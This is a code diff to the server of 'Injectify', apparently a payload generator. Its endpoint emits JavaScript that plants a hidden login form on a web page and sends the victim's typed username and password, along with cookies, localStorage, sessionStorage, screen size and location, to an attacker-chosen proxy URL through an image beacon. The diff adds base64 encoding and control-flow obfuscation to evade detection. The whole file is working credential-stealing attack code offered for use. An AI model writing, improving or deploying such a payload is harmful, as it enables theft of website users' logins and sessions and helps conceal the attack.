@@ -24,6 +24,7 @@ const atob			= require('atob')
 const btoa			= require('btoa')
 const beautify		= require('js-beautify').js_beautify
 const UglifyJS		= require("uglify-js")
+const ObfuscateJS	= require('javascript-obfuscator')
 
 console.log(chalk.greenBright("[Injectify] ") + "listening on port " + config.express)
 
@@ -699,6 +700,13 @@ MongoClient.connect(config.mongodb, function(err, db) {
 	})
 
 	app.get('/payload/*', (req, res) => {
+		function enc(string) {
+			if(req.query.base64 == "false") {
+				return '"' + string + '"'
+			} else {
+				return 'atob("' + btoa(string) + '")'
+			}
+		}
 		let valid = true
 		if (!req.query.project) valid = false
 
@@ -734,49 +742,61 @@ MongoClient.connect(config.mongodb, function(err, db) {
 			if (json) 		json 		= ',' + json.slice(0, -1)
 
 			let script = `
-/***************************\\
- Injectify payload generator
- ---------------------------
- GET_PARAM              TYPE
- ---------------------------
- project              STRING
- proxy                   URL
- screenSize          BOOLEAN
- location            BOOLEAN
- localStorage        BOOLEAN
- sessionStorage      BOOLEAN
- cookies             BOOLEAN
- ---------------------------
- compress            BOOLEAN
-\\***************************/
+				// ┌─────────────────────────────────────┐
+				// │     Injectify payload engine ©      │
+				// │   INTELLECTUAL PROPERTY OF SAMDD    │
+				// ├────────────────┬─────────┬──────────┤
+				// │ GET_PARAM      │ TYPE    │ DEFAULT  │
+				// ├────────────────┼─────────┼──────────┤
+				// │ project        │ STRING  │ REQUIRED │
+				// │ proxy          │ URL     │ NONE     │
+				// │ base64         │ BOOLEAN │ TRUE     │
+				// │ obfuscate      │ BOOLEAN │ FALSE    │
+				// │ minify         │ BOOLEAN │ FALSE    │
+				// │                │         │          │
+				// │ screenSize     │ BOOLEAN │ TRUE     │
+				// │ location       │ BOOLEAN │ TRUE     │
+				// │ localStorage   │ BOOLEAN │ TRUE     │
+				// │ sessionStorage │ BOOLEAN │ TRUE     │
+				// │ cookies        │ BOOLEAN │ TRUE     │
+				// └────────────────┴─────────┴──────────┘
+				//  Project name    | ` + req.query.project + `
 
-var d = document,
-	v = "input",
-	w = d.createElement("form"),
-	x = d.createElement(v),
-	r = new Image(),
-	k = window` + variables + `
-x.name = ""
-x.style = "display:none"  
 
-var y = x.cloneNode()
-y.type = atob("cGFzc3dvcmQ=")
+				var d = document,
+					v = ` + enc("input") + `,
+					w = d.createElement(` + enc("form") + `),
+					x = d.createElement(v),
+					r = new Image(),
+					k = window` + variables + `
+				x.name = ""
+				x.style = `+ enc("display:none") + `
 
-w.appendChild(x)
-w.appendChild(y)
-d.body.appendChild(w)
+				var y = x.cloneNode()
+				y.type = ` + enc("password") + `
 
-y.addEventListener(v, function () {
-	var i = {
-		a: atob("` + btoa(req.query.project) + `"),
-		b: x.value,
-		c: y.value` + json + `
-	}
-	r.src = atob("` + btoa(proxy) + `") + btoa(JSON.stringify(i))
-	w.remove()
-})
+				w.appendChild(x)
+				w.appendChild(y)
+				d.body.appendChild(w)
+
+				y.addEventListener(v, function () {
+					var i = {
+						a: atob("` + btoa(req.query.project) + `"),
+						b: x.value,
+						c: y.value` + json + `
+					}
+					r.src = atob("` + btoa(proxy) + `") + btoa(JSON.stringify(i))
+					w.remove()
+				})
 			`
-			if (req.query.compress == "true") {
+			if (req.query.obfuscate == "true") {
+				res.send(
+					ObfuscateJS.obfuscate(UglifyJS.minify(script).code, {
+						compact: true,
+						controlFlowFlattening: true
+					}).obfuscatedCode
+				)
+			} else if (req.query.minify == "true") {
 				res.send(
 					UglifyJS.minify(script).code
 				)
@@ -789,22 +809,31 @@ y.addEventListener(v, function () {
 			}
 		} else {
 			res.setHeader('Content-Type', 'application/javascript')
-			res.send(`
-/***************************\\
- Injectify payload generator
- ---------------------------
- GET_PARAM              TYPE
- ---------------------------
- project              STRING
- proxy                   URL
- screenSize          BOOLEAN
- location            BOOLEAN
- localStorage        BOOLEAN
- sessionStorage      BOOLEAN
- cookies             BOOLEAN
- ---------------------------
- compress            BOOLEAN
-\\***************************/`)
+			let script = `
+			// ┌─────────────────────────────────────┐
+			// │     Injectify payload engine ©      │
+			// │   INTELLECTUAL PROPERTY OF SAMDD    │
+			// ├────────────────┬─────────┬──────────┤
+			// │ GET_PARAM      │ TYPE    │ DEFAULT  │
+			// ├────────────────┼─────────┼──────────┤
+			// │ project        │ STRING  │ REQUIRED │
+			// │ proxy          │ URL     │ NONE     │
+			// │ base64         │ BOOLEAN │ TRUE     │
+			// │ obfuscate      │ BOOLEAN │ FALSE    │
+			// │ minify         │ BOOLEAN │ FALSE    │
+			// │                │         │          │
+			// │ screenSize     │ BOOLEAN │ TRUE     │
+			// │ location       │ BOOLEAN │ TRUE     │
+			// │ localStorage   │ BOOLEAN │ TRUE     │
+			// │ sessionStorage │ BOOLEAN │ TRUE     │
+			// │ cookies        │ BOOLEAN │ TRUE     │
+			// └────────────────┴─────────┴──────────┘
+			`
+			res.send(
+				beautify(script, {
+					indent_size: 2
+				})
+			)
 		}
 	})
 
